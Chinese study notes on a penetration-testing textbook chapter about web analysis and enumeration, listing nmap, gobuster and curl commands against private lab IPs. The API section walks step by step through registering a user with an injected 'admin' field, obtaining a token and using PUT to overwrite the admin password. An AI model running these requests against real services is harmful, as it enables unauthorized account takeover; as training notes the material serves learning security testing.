本篇对应教材第8章，主要内容“WEB分析工具”和“WEB应用枚举”，记录使用工具和命令

## 8.2 Web分析工具

### 8.2.1 web服务指纹

nmap扫描web服务

```python
sudo nmap -p80  -sV 192.168.50.20
```

http枚举

```python
sudo nmap -p80 --script=http-enum 192.168.50.20
```

### 8.2.2 Wappalyzer

网站

```python
https://www.wappalyzer.com/
```

### 8.2.3 目录枚举

```python
gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
```

### 8.2.4 Burp

图形界面操作

## 8.3 Web应用枚举

### 8.3.2 http头和sitemaps枚举

```python
curl https://www.google.com/robots.txt
```

### 8.3.3 API枚举

```python
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern

curl -i http://192.168.50.16:5002/users/v1

gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
curl -i http://192.168.50.16:5002/users/v1/admin/password
可能返回错误，一般需要post或者put，前提是要先登录成功
curl -i http://192.168.50.16:5002/users/v1/login
提示用户错误，尝试admin用户
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
提示密码不对，注册新用户
curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register
提示需要email，增加email参数再注册
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
注册成功，登录
curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
登录成功，获得token后，尝试修改admin密码
curl  \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'
方法不允许，尝试put
curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
修改成功，登录admin
curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

```

更多更新资料（微信公众号：TopRedTeam）

![](./qrcode.jpg)
